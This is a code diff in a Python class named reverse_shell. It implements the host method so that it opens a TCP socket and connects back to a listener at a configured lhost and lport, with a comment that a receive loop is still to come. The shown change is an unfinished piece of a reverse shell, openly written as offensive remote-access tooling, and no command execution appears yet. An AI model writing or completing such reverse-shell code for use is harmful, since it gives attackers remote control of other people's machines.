@@ -37,7 +37,12 @@ class reverse_shell:
     def host(self):
         """Runs main loop for host, beacons back to listener
         """
-        pass
+        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.verbose('[+] Created socket')
+        self.socket.connect((self.parser.lhost, self.parser.lport))
+        self.verbose(
+            f'[+] Socket connected to {self.parser.lhost}:{self.parser.lport}')
+        # send to new function to run recv loop
 
     def listener(self):
         """Runs main loop for listener, listens for beacons from host
